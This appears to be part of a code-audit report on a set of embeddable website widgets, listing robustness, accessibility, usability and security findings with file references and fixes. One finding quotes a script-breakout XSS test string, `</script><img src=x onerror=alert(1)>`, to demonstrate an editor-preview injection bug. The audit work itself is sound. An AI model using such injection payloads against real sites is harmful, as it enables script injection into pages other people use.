- **⚪ Low · security** — Leaflet <script> and <link> injected into the host document.head (CSP deviation)
  - `public/widget-attraction.js:213-230 (loadLeaflet), 438-442 (shadow CSS link)`
  - **Breaks:** Widget embedded on a site with Content-Security-Policy 'script-src self': the browser blocks the unpkg.com script, s.onerror rejects, _initMap's .catch swallows it, and the 'Getting there' map (.tgx-map) stays an empty grey box (background var(--tgx-border-soft)) with no message, though the text directions below still render.
  - **Fix:** If this matches the other map widgets by design, document the required CSP allowance (unpkg.com script-src/style-src) in the embed docs. Optionally hide the empty .tgx-map container on Leaflet load failure so it does not render as a blank grey block.
- **⚪ Low · dead-end** — Call-to-action renders a heading and body but no clickable button when Button URL is blank (the default)
  - `public/widget-attraction.js:587-604; default at line 358; editor default at public/editor-attraction.html:165,352`
  - **Breaks:** An editor user picks an attraction, leaves defaults, saves. The published widget ends with a gradient panel reading 'Plan your visit to {name}... Speak to us about packaging tickets, hotels and transfers' with nothing to click, so the intended enquiry path dead-ends.
  - **Fix:** Either make Button URL effectively required when the CTA section is enabled (warn/validate in the editor before save), or suppress the whole .tgx-cta panel when there is no URL so a section promising an action never renders without one.
- **⚪ Low · usability** — Map enables scroll-wheel zoom on click and can hijack page scrolling
  - `public/widget-attraction.js:446, 456-457`
  - **Breaks:** A visitor clicks the map pin to read the popup, then scrolls to continue down the article; because the cursor is still over the map the wheel zooms the map rather than scrolling the page, briefly trapping the scroll until they move the pointer off the map.
  - **Fix:** Prefer a gesture-gated approach (require ctrl/cmd+wheel, or Leaflet's gestureHandling) rather than enabling scrollWheelZoom on plain click, or leave scrollWheelZoom disabled and rely on the +/- zoom control that is already present (zoomControl:true).
- **⚪ Low · accessibility** — Editor attraction-search input has no associated label
  - `public/editor-attraction.html:132`
  - **Breaks:** A screen-reader user tabbing through the Content tab reaches the search field and hears only 'edit text, blank' (or the placeholder, which disappears once typing starts) with no persistent label, making the main attraction-selection control hard to identify.
  - **Fix:** Add a visible or visually-hidden <label for="at-search">Search attractions</label>, or at minimum an aria-label="Search attractions" on the input.

### `consent`  — 5 findings (4 medium, 1 low)

> The consent widget is well-built and notably security-clean: every config string is escaped (esc), URLs are whitelisted (safeUrl blocks javascript:/data:), colours/fonts/numbers are validated, storage is try/catch-wrapped, resolveApiBase honours __TG_WIDGET_API__ then script origin, and there is a proper double-init guard. I found no XSS or CSP violations in the widget, editor, or demo. The real issues are on the robustness/dead-end axis: the whole UI is gated behind an untimed geo fetch, the public API throws if called during the async init window, the modal layout can clip its own action buttons on short screens, and the aria-modal dialog has no focus trap while the first banner disables Escape. Ranked below.

- **🟡 Medium · dead-end** — Untimed geo fetch on the critical render path can permanently strand the banner
  - `public/widget-consent.js:656 (resolveGeo) and :1037 (config fetch), consumed at :1009-1012`
  - **Breaks:** A visitor loads a site whose /api/consent-geo (or /api/widget-config) request stalls — connection accepted, response never sent (hung edge function, dead proxy holding the socket). resolveGeo's promise never settles, makeUi is never called, so the banner and badge never appear and the visitor has no consent surface for the session, while analytics/marketing stay denied.
  - **Fix:** Wrap the geo and config fetches in Promise.race against a timeout (e.g. 1000-1500ms via AbortController or a timer resolving to {mode:'gdpr',country:''}) so makeUi always runs and fails safe to the GDPR opt-in banner even when the endpoint hangs.
- **🟡 Medium · robustness** — Public mutating API methods throw if called before async init completes
  - `public/widget-consent.js:621-627 (applyChoice), exposed via :960-979 (window.tgConsent)`
  - **Breaks:** A customer wires a site button to window.tgConsent.acceptAll() and the visitor clicks it before the geo/config fetch resolves. applyChoice dereferences null.policyVersion and throws; the click records no consent and logs an uncaught error.
  - **Fix:** Add an early guard `if (!state.cfg) return;` (or queue the call to replay after boot) at the top of applyChoice and openPreferences so pre-init API calls no-op instead of throwing.
- **🟡 Medium · circle-of-doom** — Modal-layout first banner clips its own action buttons on short viewports
  - `public/widget-consent.js:698 & :701 (CSS), rendered by :807-821 (showBanner)`
  - **Breaks:** A GDPR visitor on a phone in landscape sees a modal-layout banner with the author's long body text; the Accept/Reject/Preferences buttons are clipped below the visible panel and cannot be scrolled to, and the modal blocks the rest of the page, so no consent choice can be made.
  - **Fix:** Give the modal first-layer banner an inner scroll region (make .inner overflow-y:auto within the panel max-height) or pin .btns as a non-scrolling footer like .prefs-foot, mirroring the preference layer's overflow handling.
- **🟡 Medium · accessibility** — aria-modal banner has no focus trap and the first-layer modal disables Escape
  - `public/widget-consent.js:810 & :842 (aria-modal dialogs) and :941-946 (prefs-only keydown)`
  - **Breaks:** A keyboard-only visitor on a modal-layout consent banner presses Tab a few times and lands on controls in the blurred page behind the overlay, with Escape doing nothing on the banner, and cannot reliably return to the Accept/Reject controls.
  - **Fix:** Add a focus trap that cycles Tab/Shift-Tab within the dialog for aria-modal views, and move focus to a sensible target (badge or previously focused element) when the banner is replaced by the badge.
- **⚪ Low · dead-end** — Disabling the badge with no site-side reopen hook leaves no way to withdraw consent
  - `public/widget-consent.js:869-879 (showBadge) and :948-957 (site reopen hooks)`
  - **Breaks:** An author turns the badge off for aesthetics and forgets to add a footer 'Cookie settings' link; a returning visitor who wants to withdraw analytics consent has no reachable control.
  - **Fix:** When badge:false, verify at least one site-side reopen hook exists (or keep a minimal always-available control and surface a console/editor-preview warning), so consent stays as easy to withdraw as it was to give.

### `currency`  — 5 findings (2 medium, 3 low)

> The Currency Converter widget is well-built and largely clean: config is defended (esc() everywhere, hex/font whitelists, currency codes filtered against a NAMES allowlist before use), Shadow DOM with :host{all:initial}, a proper double-init guard plus a debounced MutationObserver, fetch calls have .ok/.catch handling, and divide-by-zero is guarded (null rate short-circuits). No XSS sinks, no CSP violations, no client-side plan gating, no unescapable modal or focus trap. The main real-visitor issue is a fallback DEAD END: when the live-rates fetch fails and the widget is configured with currencies outside the 12-entry built-in fallback table (18 of the 30 supported codes are absent), the result renders a permanent "—" with no explanation. Secondary issues: incorrect fallback maths when the base currency is not in the fallback table, a convention miss (resolveBase ignores window.__TG_WIDGET_API__), and two accessibility gaps (editor currency chips are not keyboard-operable, widget result has no aria-live).

- **🟡 Medium · dead-end** — Offline fallback strands the visitor on a permanent "—" for any currency not in the 12-entry fallback table
  - `public/widget-currency.js:262-278 (_useFallback + _rate), consumed by _compute at :294-296`
  - **Breaks:** Client configures currencies ['GBP','PLN','RON']. /api/fx-rates fails (network blip, ad-blocker, outage). Visitor enters an amount and selects PLN/RON in either field; result stays '—' because neither exists in the fallback table. Only GBP-to-GBP would compute. The converter is effectively dead with no explanation.
  - **Fix:** Either extend FALLBACK_GBP to cover the full NAMES allowlist, or when a selected currency has no offline rate render an explicit in-result message (e.g. t('indicativeRates') + 'rate unavailable offline') instead of returning early on a bare '—'.
- **🟡 Medium · robustness** — Fallback conversions involving the base currency are wrong when the base is not in the fallback table
  - `public/widget-currency.js:266 (baseInGbp = g[base] || 1), 268-269`
  - **Breaks:** baseCurrency 'SEK' (not in FALLBACK_GBP), rates fetch fails. Converting 100 SEK to EUR reports ~117 EUR as if 100 SEK equalled 100 GBP — about 13x too high.
  - **Fix:** If g[base] is undefined, return null for base-involving conversions so the offline/unavailable message shows, rather than substituting 1; or add all base-eligible codes to FALLBACK_GBP.
- **⚪ Low · robustness** — resolveBase ignores window.__TG_WIDGET_API__ override required by the embed contract
  - `public/widget-currency.js:62-74 (resolveBase)`
  - **Breaks:** An integrator or the dashboard preview sets window.__TG_WIDGET_API__ to a staging origin. This widget ignores it and calls the production origin (or, if currentScript and the tag scan both fail, a relative /api that 404s on the customer domain), so the override has no effect.
  - **Fix:** In resolveBase, check window.__TG_WIDGET_API__ first, then the currentScript/script-tag origin, matching the resolveApiBase() contract used by the rest of the suite.
- **⚪ Low · accessibility** — Editor currency chips cannot be toggled by keyboard
  - `public/editor-currency.html:386-392 (buildCurrencyGrid) and :429-440 (click handler)`
  - **Breaks:** A keyboard-only editor tabs through the Content tab, reaches the 'Currencies shown' grid, and Tab/Space/Enter do nothing — the chips are skipped and never respond, leaving the currency list uneditable without a mouse.
  - **Fix:** Render each chip as a real focusable control (a <button> with aria-pressed, or a checkbox <input> inside the label) and handle Enter/Space so the grid is operable and announced.
- **⚪ Low · accessibility** — Converted result is not announced to screen readers when amount or currency changes
  - `public/widget-currency.js:220-221 (.tgc-out / #result) and :288-308 (_compute updates)`
  - **Breaks:** A blind visitor types 250 into the amount field; the visible result updates but nothing is announced, so they cannot tell a conversion occurred or what it produced without manually re-navigating to the result node.
  - **Fix:** Add aria-live="polite" (optionally aria-atomic="true") to .tgc-out or #result so recomputed values are announced.

### `editor-shell`  — 5 findings (2 medium, 3 low)

> tgse-rules.js (evaluate/armTrigger/armDeferred) is robust — consistent fail-open, try/catch storage, fire-once guards, cleanup on every armer, no eval/injection sink — and the shell's fetch interceptor and escaping are security-clean. The real issues are all in the shell's save + auth + modal UX: doSave() has no fetch timeout so a stalled save locks the button forever; showLogin() unconditionally navigates away (the documented in-page login overlay is dead code), silently discarding unsaved edits and risking a signin/editor redirect loop when cookie auth can't resolve; and the embed modal has no focus management. A couple of low-severity leaks/traps round it out. No XSS, CSP, or gating-trust problems found.

- **🟡 Medium · dead-end** — doSave() has no timeout — a stalled network locks the Save button in 'Saving…' forever
  - `public/editor-shell.js:679-742`
  - **Breaks:** Editor user on a flaky mobile/hotel connection clicks Save; the request stalls with the socket half-open. The button shows 'Saving…' and is pointer-events:none, no toast appears, and the spinner never resolves. Cmd/Ctrl+S still fires doSave (keyboard bypasses pointer-events) but only starts another parallel request, so there is no clean recovery short of a page reload that discards unsaved edits.
  - **Fix:** Wrap the fetch in an AbortController with a ~20s timeout; on abort run the same recovery as the catch block: toast('Save failed — network error','err') and setSaveState('dirty') so the button becomes clickable again. Optionally guard against a second doSave while one is already in flight.
- **🟡 Medium · circle-of-doom** — showLogin() always redirects away, discarding unsaved edits; the in-page login overlay is dead code
  - `public/editor-shell.js:506-512`
  - **Breaks:** A cookie session expires while the editor is mid-edit. The user clicks Save, doSave hits 401, calls clearSession() + showLogin(); the browser immediately navigates to /signin.html. The 'Session expired' toast flashes for a few ms before unload and every unsaved config change is lost with no confirm. Separately (plausible, not provable here) if auth can never resolve, applyAuthGate on boot redirects to /signin.html which on return re-fails the check → redirect loop.
  - **Fix:** Add a beforeunload/confirm guard when saveDirty is true before redirecting, or revive the in-page overlay so an expiring session does not blow away unsaved work; delete the dead buildLoginOverlay/doLogin block (and fix the misleading comments) to remove the false 'overlay' contract; guard against re-redirecting when the page already came from /signin.html.
- **⚪ Low · accessibility** — Embed modal has no focus management, focus trap, or aria-modal
  - `public/editor-shell.js:846-912`
  - **Breaks:** A keyboard-only or screen-reader user opens the embed modal. Focus stays on the dimmed page behind it, so Tab walks the sidebar tabs/inputs underneath instead of Close/Copy, and the screen reader is not told a modal opened. On close, focus is lost to the top of the document rather than returning to the trigger.
  - **Fix:** On openModal: set aria-modal="true", store document.activeElement, move focus to the first control (Close), and trap Tab within the card. On closeModal: restore focus to the stored element. Escape close already works.
- **⚪ Low · robustness** — mountFontPicker() leaks a document-level click listener on every call
  - `public/editor-shell.js:609-614`
  - **Breaks:** An editor that re-mounts the font picker on each 'load template' action adds a new document click handler every time. After N loads the document has N handlers over stale detached picker nodes — a growing leak, and each click runs all N handlers.
  - **Fix:** Store the outside-click handler and expose destroy() on the returned object to removeEventListener it, or attach one listener at module scope that looks up the live picker by selector.
- **⚪ Low · usability** — Single-letter shortcuts (a/t/d/1/2/3) hijack typing in bare contenteditable regions
  - `public/editor-shell.js:933`
  - **Breaks:** If a widget design-mode makes preview text editable via a bare contenteditable div, the user typing a/t/d has those keys swallowed and instead triggers the AI builder / Templates / Design-mode toggle, and 1/2/3 switch sidebar tabs — corrupting the inline edit. No current editor markup uses bare contenteditable, so it is latent.
  - **Fix:** Broaden the guard to also test e.target.isContentEditable (true for both contenteditable and contenteditable="true"), e.g. inField = e.target.isContentEditable || e.target.closest('input,textarea,select').

### `enquirypro`  — 5 findings (3 medium, 2 low)

> Enquiry Pro is a clean, security-conscious multi-step form: every dynamic value is written via textContent/createTextNode (no innerHTML/XSS sinks), colours pass safeHex, the thank-you redirect is restricted to http(s), storage is try/catch-wrapped, it uses Shadow DOM with :host{all:initial}, has a double-init guard, resolves API base from its own script origin, and its fetch calls (config, destination search, submit) all have error handling with real oops/error states. No CSP violations, no unsanitised sinks, no infinite spinners. Five real issues found: a production i18n bug on live embeds, a Turnstile-failure trap that can permanently block submission, lost focus on every step change, a dead guided-tour control in the demo, and an unbounded brand-colour that can make the primary CTA invisible.

- **🟡 Medium · robustness** — Live remote-config embeds never apply author translations (_applyI18n omitted)
  - `public/widget-enquirypro.js:1740-1742`
  - **Breaks:** An agent configures French header + thank-you translations in config.i18n.fr. A French visitor loads the widget on the client site via the normal `<div data-tg-widget="enquirypro" data-tg-id=...>` remote-config path. UI chrome translates to French (makeT resolves fr), but the header title on step 1 and the custom thank-you message on submit render in the original English author copy because the overlay never runs. Inline data-tg-config embeds (which go through the constructor) behave correctly, so the bug is invisible in most previews.
  - **Fix:** Add `w._applyI18n();` immediately after `w.config.isLiveEmbed = true;` at line 1742, matching the constructor order (_normalise then _applyI18n before _render).
- **🟡 Medium · circle-of-doom** — Turnstile load/challenge failure permanently blocks submission with no client escape
  - `public/widget-enquirypro.js:1529-1531`
  - **Breaks:** Turnstile is enabled and a visitor on a restrictive network/extension has the challenge iframe blocked or errored. They complete all five steps, press Send, and get 'Please complete the security check above' pointing at a widget that shows nothing actionable. Every retry re-arms the same failing challenge. The lead is lost.
  - **Fix:** In createTurnstileFrame add a load/response timeout: if no token arrives within ~15s (or on an 'error'/'timeout' message) surface a visible retry/reload affordance in the .ep-turnstile area, and consider a documented server-side soft-allow so a broken challenge degrades to server validation instead of a permanent client block.
- **🟡 Medium · accessibility** — Focus is lost to document body on every step change
  - `public/widget-enquirypro.js:1056-1107`
  - **Breaks:** A keyboard or screen-reader user completes step 1 and presses Continue: the new step renders but focus drops to document.body, so the next Tab starts from the top of the host page rather than the form, and the screen reader announces nothing about the new question. This repeats across all five steps and on Back.
  - **Fix:** After building each step in _renderStep, move focus to the step heading (give .ep-q tabindex=-1 and call .focus()) or to the first interactive control, and wrap the step region in an aria-live=polite container so the new question is announced.
- **⚪ Low · dead-end** — Demo guided tour is a dead control — tour-enquirypro.js is missing
  - `public/demo-enquirypro.html:70-74`
  - **Breaks:** Anyone opening /demo-enquirypro to try the guided product tour gets a 404 for /tour-enquirypro.js and an uncaught ReferenceError at line 73 (TGEnquiryProTour is not defined); the tour silently never starts.
  - **Fix:** Either add public/tour-enquirypro.js, or guard the call (`if (window.TGEnquiryProTour) TGEnquiryProTour.mount(...)`) and remove the dead <script> tag until the tour exists.
- **⚪ Low · ux-ui** — Custom brand colour has no contrast guard — a light buttonColour makes the primary CTA text invisible
  - `public/widget-enquirypro.js:894`
  - **Breaks:** An agent sets buttonColour to a pale hex such as #FDE047 or #E5E7EB. safeHex accepts it, --brand becomes that colour, and 'Continue' / 'Send my enquiry' render as white text on a near-white pill, effectively invisible on every step.
  - **Fix:** In _applyTheme compute the button text colour from the brand's relative luminance (choose #fff or a dark ink), or clamp/darken very light brand colours before assigning --brand, and set a `--brand-ink` variable that .ep-next uses instead of a hardcoded #fff.

### `share`  — 5 findings (1 medium, 4 low)

> The share widget is largely clean and defensively written: Shadow DOM with :host{all:initial}, a proper resolveApiBase() (and a matching TRACK_BASE resolver), esc()/safeColor()/safeFontStack()/safeUrl() applied to every config value that reaches innerHTML or the root style attribute, share hrefs built only from a hardcoded platform switch with encodeURIComponent'd params, no inline handlers/injected script/eval, fetch wrapped in try/catch that fails closed, storage-free, and a double-init guard plus listener teardown in update()/destroy(). No XSS, CSP, or hard circle-of-doom traps were found (the compact popover closes on outside click, no focus trap). The findings are UX/robustness edges: the default 'rail' layout is display:none on mobile with no fallback so all mobile visitors see nothing, a couple of config combinations that render an empty/do-nothing widget, and minor clamp/a11y gaps.

- **🟡 Medium · dead-end** — Default 'rail' layout is hidden on mobile with no fallback — mobile visitors get no share control at all
  - `public/widget-share.js:477-478 and :513; editor default public/editor-share.html:391,686`
  - **Breaks:** A customer embeds with default config (layout 'rail'). On a travel site where most traffic is mobile, every visitor at viewport <=600px gets the rail rendered but display:none, so there is no share affordance at all — the feature silently does nothing for the majority of the audience.
  - **Fix:** On <=600px fall back the rail to a dock (or a compact trigger) instead of display:none, and/or change the editor default to 'dock' and add a visible note that 'rail' is hidden on mobile.
- **⚪ Low · dead-end** — Native-only (or all-filtered) platform config renders an empty, do-nothing widget on desktop
  - `public/widget-share.js:598-605 (_renderButtons native filter), :624-635 (compact), :612-640 (other layouts)`
  - **Breaks:** An editor user selects only the Native platform and saves. A desktop visitor (no navigator.share) sees either nothing (rail/dock/inline) or a Share button whose popover is empty — a control that does nothing.
  - **Fix:** After filtering, if zero buttons remain either force-inject 'copy' as a fallback or suppress the trigger/container entirely; in the editor, block saving a platform set that filters to empty on non-native devices.
- **⚪ Low · usability** — Copy button gives no feedback and appears dead when both clipboard paths fail
  - `public/widget-share.js:755-784 (_copyLink / _fallbackCopy)`
  - **Breaks:** A visitor on an http (non-secure) embed in a browser without execCommand copy support clicks Copy link: nothing is copied and no toast or error shows, so the control reads as broken.
  - **Fix:** In the failure path show observable feedback — select/prompt the URL or a 'Press Ctrl+C' hint — so every click produces a visible result.
- **⚪ Low · robustness** — iconSize and theme.radius are not clamped in the widget — hostile/typo/inline config can produce an oversized or collapsed layout
  - `public/widget-share.js:518 (iconSize), :534 (radius), :545-546 (_themeStyle)`
  - **Breaks:** A stored config or inline data-tg-config with iconSize:99999 (bad import or client tampering) renders share buttons thousands of pixels wide, covering the host page; a negative value collapses them to nothing.
  - **Fix:** Clamp iconSize (e.g. 24–64) and radius (e.g. 0–32) inside _defaults() before they reach _themeStyle.
- **⚪ Low · accessibility** — Compact popover cannot be dismissed with the keyboard (no Escape handler)
  - `public/widget-share.js:655-680 (compact trigger/pop binding), :631 (role=menu)`
  - **Breaks:** A keyboard or screen-reader user opens the compact share menu, then wants to dismiss it without picking a platform — pressing Escape does nothing, so the menu stays open until they tab to an outside element and trigger a click.
  - **Fix:** Add a keydown handler that closes the popover on Escape and returns focus to the trigger; apply role="menuitem" to the contained buttons/links (or drop role="menu" for a plain group).

### `travel-results-ai`  — 5 findings (2 medium, 3 low)

> The widget is well built and largely clean: all untrusted AI/supplier text is rendered via textContent (no innerHTML XSS sinks in the widget), Shadow DOM with :host{all:initial} is used, storage is JSON-encoded and try/catch-wrapped, config is sanitised (hex whitelist, clamped numbers, string caps), reduced-motion is respected, cards are keyboard-operable with roles/aria, Escape minimises, and the launcher/panel/minimise flows are all escapable (no true focus trap or unrecoverable modal). The main real issues are: (1) fetch calls have no timeout/abort, so a stalled connection leaves the panel stuck on a loading state with the footer disabled and no way forward; (2) there is no cross-instance double-init guard, so a double-installed script mounts two overlapping panels; plus a few low-severity items (editor preview data-URL script break via </script> in copy, stale minimise aria-label, and API_BASE hardcoding the prod origin instead of the script origin). No client-side gating trust and no injected-script/eval CSP violations in the widget itself.

- **🟡 Medium · dead-end** — Loading/thinking state can never resolve on a stalled connection (no fetch timeout)
  - `public/widget-travel-results-ai.js:665 (callEndpoint), 972 (processInitial setFootEnabled(false)), 1034/1043 (sendMessage)`
  - **Breaks:** A visitor behind a slow proxy or hitting a serverless cold-start where the TCP connection is accepted but the body never arrives. Initial analysis: panel stuck on 'Reading N results, finding the best…' forever, footer disabled so the visitor cannot type, retry, or reach any recommendation. Refinement: the 'Thinking…' dot pulses indefinitely after the typed message was already cleared. The existing fallbackRecs/renderError recovery is never triggered because fetch neither resolves nor rejects.
  - **Fix:** Wrap the fetch in callEndpoint with an AbortController and a ~15-20s timeout (clearTimeout on settle, controller.abort() on expiry). An abort rejects the promise, routing into the existing .catch fallback (fallbackRecs → renderRecs, which re-enables the footer) so the visitor always lands on picks or a recoverable state.
- **🟡 Medium · robustness** — No cross-instance double-init guard — script included twice mounts two overlapping panels
  - `public/widget-travel-results-ai.js:24 (presence flag set, never read to bail), 676-677 (mount closure-local host guard), 1282-1291 (boot)`
  - **Breaks:** On a site where the script tag is included twice (header pasted twice, or header plus an accidental container embed), the results-ready event fires two independent instances. Each appends its own fixed div#tg-trai-host and mounts a full floating panel at the same corner, so the visitor sees two overlapping assistants, and every API call and analytics event is doubled.
  - **Fix:** At the very top of the IIFE, read the window-level flag before setting it: `if (window.TravelgenixWidgets && window.TravelgenixWidgets.travelResultsAi) return;` then set it — a second copy no-ops. (Note: the flag is intentionally announced early for the results widget, so the read must precede the write of that same flag, or use a separate window.__TG_TRAI_LOADED__ guard.)
- **⚪ Low · security** — Editor preview breaks (and can inject markup) when Title/Greeting contains the literal </script>
  - `public/editor-travel-results-ai.html:592 (JSON.stringify(cfg) into inline <script>), 373 (iframe has no sandbox attr despite 'sandboxed' comment)`
  - **Breaks:** The editor user types a Title or Greeting such as `</script><img src=x onerror=alert(1)>`. The live preview silently breaks (config after the injection point is lost, widget may misrender) and the injected markup executes inside the preview iframe. Isolated to the opaque data: origin so it cannot touch the editor's cookies/DOM, but it corrupts the preview for any value merely containing the substring </script>.
  - **Fix:** Escape the serialised config before embedding, e.g. `JSON.stringify(cfg).replace(/</g,'\\u003c')`, or deliver the config via a non-executable channel (a `<script type="application/json">` element the preview reads, or postMessage) instead of concatenating into an inline script. Optionally add a real sandbox attribute to the iframe.
- **⚪ Low · accessibility** — Minimise control keeps a stale aria-label and no expanded/collapsed state when docked to the header bar
  - `public/widget-travel-results-ai.js:740 (aria-label set once), 710-720 (minimise toggles is-min only), 1384 (markup: min button has no aria-expanded)`
  - **Breaks:** A screen-reader visitor minimises the panel to the header bar, then wants it back. The only control is the same #min button, still announced 'Minimise assistant', giving no cue that activating it re-opens the body — the toggle's two states are indistinguishable to assistive tech.
  - **Fix:** Add aria-expanded to the #min button (true when body visible, false when is-min) and swap its aria-label between minimise and expand wording inside minimise(), keyed off the willMin value already computed at line 712.
- **⚪ Low · robustness** — AI endpoint base hardcodes the production origin instead of the script's own origin
  - `public/widget-travel-results-ai.js:358-359 (API_BASE), contrast 403-406 (configApi derives from SELF.src)`
  - **Breaks:** When the script is served from the alias origin (widgets.travelify.io) or a future/staging host, every AI call still goes cross-origin to tg-widgets.vercel.app. It works today only because the request uses mode:'cors' and that host allows it; if the CORS allowance or host ever changes, calls break with no fallback to the serving origin. It also silently couples all deployments to one origin.
  - **Fix:** Derive the default from the script origin as configApi does — e.g. `(window.__TG_TRAI_API__) || (SELF && SELF.src ? new URL(SELF.src).origin + '/api/travel-results-ai' : 'https://tg-widgets.vercel.app/api/travel-results-ai')` — keeping the __TG_TRAI_API__ override first. Move this after SELF is defined (or compute it lazily) since SELF is declared below the current API_BASE line.

### `contact`  — 4 findings (2 medium, 2 low)

> The contact widget is clean and secure. All config strings pass through esc() before innerHTML, safeUrl() correctly blocks javascript:/data: URLs, colours and font stacks are whitelisted, Shadow DOM isolation is intact, resolveApiBase() honours the override then script origin, the auto-init has a double-init guard, and the remote fetch is wrapped in try/catch with graceful empty-state degradation. No XSS, CSP, token-leak, trap, or unclosable-state problems were found. The editor boots correctly via tgse.onReady and tears down/recreates the widget instance each render (no listener leak). The findings below are functional/UX edge cases: a radius value that a control can select but the widget silently overrides, scheme-less URLs dropped with no feedback, one same-tab WhatsApp inconsistency, and low-contrast supplementary labels. None are critical.

- **🟡 Medium · dead-end** — Corner radius of 0 is unreachable — slider value silently overridden to 16px
  - `public/widget-contact.js:684`
  - **Breaks:** In the editor an author drags Corner radius to the 0 stop. The readout shows '0px' and C.radius is set to 0, but both the live preview and the deployed widget render 16px rounded corners. The slider moved to its extreme but nothing changed visually — the control looks broken at the 0 end.
  - **Fix:** Use null-aware coercion: `const n = Number(c.radius); const radius = Math.max(0, Math.min(40, Number.isFinite(n) ? n : 16));` so 0 is preserved while non-numeric/empty falls back to 16.
- **🟡 Medium · usability** — Website and social URLs without a scheme are silently dropped from the rendered widget
  - `public/widget-contact.js:140`
  - **Breaks:** An author types 'sunwardtravel.co.uk' into Website or 'facebook.com/sunward' into a social URL. The value saves, but the website row / social icon never renders in the live preview or the published widget, with no error. The scheme-less website is still written to the downloaded vCard (widget-contact.js:184), so the omission is inconsistent and the author cannot tell why the detail vanished.
  - **Fix:** Normalise on blur in the editor by prepending 'https://' to website/social values lacking a scheme, or show inline validation. Alternatively have safeUrl treat a bare domain as https:// so preview matches author intent (and keep the vCard consistent with the rendered output).
- **⚪ Low · ux-ui** — WhatsApp channel in the panel layout opens in the same tab, unlike card/strip layouts
  - `public/widget-contact.js:775`
  - **Breaks:** A visitor on a customer site using the default panel layout taps WhatsApp and is navigated away from the host page to wa.me in the same tab, losing their place. The same tap in card/strip layouts opens a new tab, so behaviour is inconsistent across layouts.
  - **Fix:** Pass '_blank' as the target argument for the WhatsApp row in _renderChannels (line 775), matching the card and strip layouts.
- **⚪ Low · accessibility** — Supplementary channel labels and eyebrow heading fail WCAG AA contrast on the light theme
  - `public/widget-contact.js:415`
  - **Breaks:** A low-vision visitor viewing the default light-theme panel struggles to read the 'CALL' / 'EMAIL' labels and the 'Get in touch' eyebrow. The phone number and email values themselves stay high-contrast, so information is not fully lost, but the labelling and heading are hard to read.
  - **Fix:** Darken --tgc-text-3 as used for .tgc-label to at least #64748B (about 4.6:1 on white) for AA at 11px, and either enforce a minimum contrast for the eyebrow accent or render .tgc-eyebrow in --tgc-text-2 with the accent reserved for larger/decorative use.

### `dealbar`  — 4 findings (1 medium, 3 low)

> The customer-facing widget (public/widget-dealbar.js) is largely clean and CSP-compliant: every config string is escaped through esc(), safeUrl() blocks javascript:/data: schemes, safeColor()/safeFont()/clampNum() sanitise colours/fonts, it uses Shadow DOM with :host{all:initial}, resolveBase() honours __TG_WIDGET_API__ then the script origin, fetchConfig() handles network failure/non-2xx/bad JSON, localStorage is try/catch-wrapped, the countdown loop self-destroys on SPA disconnect, and the slim bar has no dismiss trap or focus trap. No XSS, no injected script, no eval. The findings below are real but concentrated in the demo page (a genuine double-init) plus two minor widget lifecycle/UX edges; the widget script itself has no critical defects.

- **🟡 Medium · robustness** — Demo page double-initialises the same mount: orphaned instance, wrong initial render, and a blank strip left after dismiss
  - `public/demo-dealbar.html:81 (mount div) + :112-123/:141 (rebuild) vs public/widget-dealbar.js:386-398 (auto-init init())`
  - **Breaks:** On demo load the visible bar shows the default render with no ✈️ emoji (default emoji is ''), not the demo's intended bar, until a control toggle triggers rebuild(). When the visitor clicks close, dismiss()->restore sets body.style.marginTop to the captured '44px' instead of '', leaving a permanent ~44px empty strip at the top of the demo page. The orphaned first instance's window 'resize' listener is never removed.
  - **Fix:** Pick one init path: either remove data-tg-widget="dealbar" from the mount (use a plain id and instantiate only in the inline script), or drop the manual rebuild()/new TGDealBarWidget calls and drive the demo purely through auto-init + instance.update(). This is demo-page-only (not visitor-facing production), hence medium not high.
- **⚪ Low · robustness** — dismiss() never removes the window resize listener (only destroy() does)
  - `public/widget-dealbar.js:346-359 (dismiss) vs :371 (removeEventListener only in destroy); listener added :297`
  - **Breaks:** Visitor closes the bar; the resize listener lingers for the page lifetime. After the 340ms restore _pushedProp is null so _onResize early-returns (benign). On SPA pages that repeatedly mount and dismiss the bar without calling destroy(), resize listeners accumulate.
  - **Fix:** Call window.removeEventListener('resize', this._onResize) inside dismiss(), or route dismiss() cleanup through the same code destroy() uses.
- **⚪ Low · dead-end** — Default CTA URL is '#', producing a do-nothing button when the link is left unset
  - `public/widget-dealbar.js:116 (DEFAULTS.ctaUrl:'#'), :269-272 (render) and public/editor-dealbar.html:379/:467`
  - **Breaks:** An author enables the button, writes a label, but leaves the Link field at the default '#'. Visitors see a prominent 'See the deals' button that only scrolls to the top of the page — a live dead-end control.
  - **Fix:** Default ctaUrl to '' (the widget already suppresses the CTA when safeUrl returns falsy at line 270), and/or show an inline editor hint when the button is enabled with an empty or '#' link.
- **⚪ Low · usability** — Editor preview vanishes with no explanation for a past countdown with 'hide when it ends' on
  - `public/widget-dealbar.js:318-326 (_renderClock dismiss on expire) vs :218 (previewMode skips _boot early-return); editor renders previewMode:true at public/editor-dealbar.html:435`
  - **Breaks:** In the editor the author enables the countdown, sets a date already in the past (or one that lapses while editing), and turns on 'Hide the bar when it ends'. The live preview immediately slides the bar off-screen leaving an empty page with no explanation; recovery requires toggling the option off or changing the date.
  - **Fix:** In _renderClock(), when this.cfg.previewMode is set, skip the dismiss()-on-expire branch and render the expired text (offerEnded / expiredText) instead so the editor preview stays visible.

### `emailsig`  — 4 findings (1 medium, 3 low)

> The emailsig widget is security-solid and largely clean: every user value is validated at source (safeColor/safeUrl/safeFontStack/clampInt/clampText) and esc()'d at injection, URLs reject javascript:/data:/control chars, colours and widths are clamped, Shadow DOM uses :host{all:initial}, and there is a proper double-init guard and resolveApiBase(). No XSS sinks, no CSP violations, no leaked tokens, no client-trusted gating. The issues found are robustness/UX dead-ends around the copy action and the remote-config failure path, plus minor accessibility gaps on the provider-guide tabs — no critical or high-severity defects.

- **🟡 Medium · dead-end** — Copy buttons fail silently with no feedback when clipboard access is blocked
  - `public/widget-emailsig.js:679-698 (_copyRichFallback), 712-720 (_copyTextFallback), 662-676/700-710 (callers)`
  - **Breaks:** A visitor on a locked-down/enterprise browser (or an http-embedded context) where the async Clipboard API is undefined and execCommand('copy') is disabled clicks 'Copy signature' or 'Copy HTML code'. Nothing visibly happens and repeated clicks keep doing nothing, with no error shown. Partial mitigation: the 'Download .htm' button (722) uses Blob/createObjectURL independently, so a determined user could still obtain the signature that way — but the copy action itself is a silent dead end.
  - **Fix:** Capture the boolean return of document.execCommand('copy') and treat false as failure; on any fallback failure surface an explicit error state (flash the button to an error label and/or reveal the raw HTML in a pre-selected textarea with a 'press Ctrl/Cmd+C to copy' hint) so the user always sees whether the copy worked and has a manual path.
